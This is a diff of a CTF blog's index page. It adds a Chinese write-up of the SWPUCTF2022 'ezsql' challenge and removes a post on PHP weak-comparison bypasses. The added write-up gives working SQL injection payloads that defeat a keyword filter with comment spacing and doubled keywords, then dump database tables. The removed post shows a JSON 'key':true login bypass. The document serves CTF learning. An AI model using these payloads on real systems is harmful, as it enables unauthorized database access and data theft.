@@ -131,6 +131,51 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/11/SWPUCTF2022-ezsql-wp/" >SWPUCTF2022-ezsql-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-11
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2881">题目链接</a></p>
+<h2 id="页面内容"><a href="#页面内容" class="headerlink" title="页面内容"></a>页面内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">年轻的Web手啊！</span><br><span class="line">看题目名就知道你该干嘛了吧~</span><br><span class="line">用相对安全的方式传参吧</span><br><span class="line">奥对了参数是nss</span><br></pre></td></tr></table></figure>
+
+<p>参数为nss， GET发送无效； POST nss&#x3D;1发送成功  返回内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag: NSSCTF&#123;This_1s_F4ke_flag&#125;</span><br><span class="line">This is true flag: NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><ul>
+<li><p>尝试联合注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2%23</span></span><br><span class="line"><span class="string">&lt; You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span>select1,<span class="number">2</span>#<span class="string">&#x27; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>从报错可以发现空格和union被消除</p>
+<p>尝试绕过   成功</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/1,2,3%23</span></span><br><span class="line"><span class="string">&lt; Flag: NSSCTF&#123;This_1s_F4ke_flag&#125;</span></span><br><span class="line"><span class="string">This is true flag: NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看第二行内容</span></span><br><span class="line"><span class="string">&gt; nss=-1&#x27;</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="operator">&lt;</span> Flag: <span class="number">2</span></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>接着常规流程注入</p>
+<p>注意or也会被屏蔽  所以information要更改为infoorrmation</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1%23</span></span><br><span class="line"><span class="string">&lt; Flag: 2</span></span><br><span class="line"><span class="string">This is true flag: NSS_tb,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt; nss=-1&#x27;</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>infoorrmation_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;NSS_tb&#x27;</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span> Flag: <span class="number">2</span></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: id,Secr3t,flll444g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/id,group_concat(Secr3t),group_concat(flll444g)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt; Flag: NSSCTF&#123;b3c1613c-6acb-46f4-9510-f3184bd69eb5&#125;</span></span><br><span class="line"><span class="string">This is true flag: NSSCTF&#123;I_d0nt_want_t0_w4ke_up&#125;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2023/07/11/SWPUCTF2022-ezsql-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/11/鹏城杯2022-简单包含-wp/" >鹏城杯2022-简单包含-wp</a>
 								</h3>
 							</div>
@@ -464,51 +509,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/03/php-weakcmp/" >php弱类型绕过</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-03
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="php弱类型绕过"><a href="#php弱类型绕过" class="headerlink" title="php弱类型绕过"></a>php弱类型绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span> == <span class="number">0</span> == <span class="literal">false</span></span><br><span class="line"><span class="string">&#x27;123&#x27;</span> == <span class="number">123</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span> == <span class="number">0</span></span><br><span class="line"><span class="string">&#x27;123a&#x27;</span> == <span class="number">123</span></span><br><span class="line"><span class="string">&#x27;0x01&#x27;</span> == <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;0e12346789&#x27;</span> == <span class="string">&#x27;0e987654321&#x27;</span>	（都解释为<span class="number">0</span>）</span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br><span class="line"><span class="literal">true</span> == <span class="number">1</span></span><br><span class="line"><span class="literal">true</span> == <span class="string">&quot;***&quot;</span>	(<span class="literal">true</span>和任意字符串弱相等)</span><br></pre></td></tr></table></figure>
-
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a target="_blank" rel="noopener" href="http://a.y1ng.vip:1126/secretjson/">secretjson</a><br>页面源码  </p>
-<pre><code class="php">&lt;?php
-include_once &#39;secret.php&#39;; // $flag  $key
-if (isset($_POST[&#39;message&#39;])) &#123;
-    $message = json_decode($_POST[&#39;message&#39;]);
-    if ($message-&gt;key == $key) &#123;
-        echo $flag;
-    &#125; 
-    else &#123;
-        echo &quot;fail&quot;;
-    &#125;
-&#125;
-else show_source(__FILE__);
-?&gt;
-</code></pre>
-<p>post –&gt; message&#x3D;{“key”:true} 即可获取flag</p>
-
-	
-	</div>
-  <a type="button" href="/2023/07/03/php-weakcmp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -568,7 +568,7 @@ else show_source(__FILE__);
 		
 			<li><a href="/categories/web-learning/">web-learning<span>1</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>12</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>13</span></a></li>
 		
 		</ul>
 	</div>
@@ -579,45 +579,45 @@ else show_source(__FILE__);
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
-		
 			<li><a href="/tags/canary/">canary<span>1</span></a></li>
-		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/web/">web<span>13</span></a></li>
-		
-			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
-		
-			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>4</span></a></li>
-		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>2</span></a></li>
-		
-			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>26</span></a></li>
-		
-			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
-		
-			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
-		
-			<li><a href="/tags/stack/">stack<span>2</span></a></li>
-		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
 		
 			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
 		
-			<li><a href="/tags/include/">include<span>1</span></a></li>
+			<li><a href="/tags/stack/">stack<span>2</span></a></li>
 		
-			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
 		
 			<li><a href="/tags/pwn/">pwn<span>7</span></a></li>
 		
-			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>8</span></a></li>
+			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
+		
+			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
+		
+			<li><a href="/tags/sql/">sql<span>3</span></a></li>
+		
+			<li><a href="/tags/php/">php<span>10</span></a></li>
+		
+			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
+		
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
+		
+			<li><a href="/tags/nssctf/">nssctf<span>21</span></a></li>
+		
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+		
+			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/unserialise/">unserialise<span>1</span></a></li>
+		
+			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>27</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>9</span></a></li>
+		
+			<li><a href="/tags/include/">include<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>30</span></a></li>
@@ -633,6 +633,10 @@ else show_source(__FILE__);
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/07/11/SWPUCTF2022-ezsql-wp/" ><i class="fa fa-file-o"></i>SWPUCTF2022-ezsql-wp</a>
+      </li>
+    
+      <li>
         <a href="/2023/07/11/鹏城杯2022-简单包含-wp/" ><i class="fa fa-file-o"></i>鹏城杯2022-简单包含-wp</a>
       </li>
     
@@ -646,10 +650,6 @@ else show_source(__FILE__);
     
       <li>
         <a href="/2023/07/08/赣网杯2021-web1-wp/" ><i class="fa fa-file-o"></i>赣网杯2021-web1-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/07/08/SWPUCTF2021-hardrce-wp/" ><i class="fa fa-file-o"></i>SWPUCTF2021-hardrce-wp</a>
       </li>
     
   </ul>
